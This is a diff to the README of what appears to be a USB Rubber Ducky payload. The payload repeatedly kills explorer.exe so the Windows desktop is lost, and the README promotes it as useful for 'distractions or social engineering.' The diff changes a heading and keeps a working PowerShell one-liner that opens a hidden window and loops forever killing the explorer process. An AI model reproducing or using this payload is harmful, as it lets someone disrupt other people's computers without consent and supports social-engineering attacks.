@@ -5,8 +5,7 @@ A ducky script that kills explorer.exe repeatedly resulting in loss of Windows D
 2. Logoff or restart to reset your windows session.
 ## Notes
 A great tool for distractions or social engineering.
-## Windows Commands (used in payload)
-### Execute DNS TXT Payload
+## Windows Command (used in payload)
 ```Powershell
 powershell /w 1 while($true){kill -name explorer}
 ```
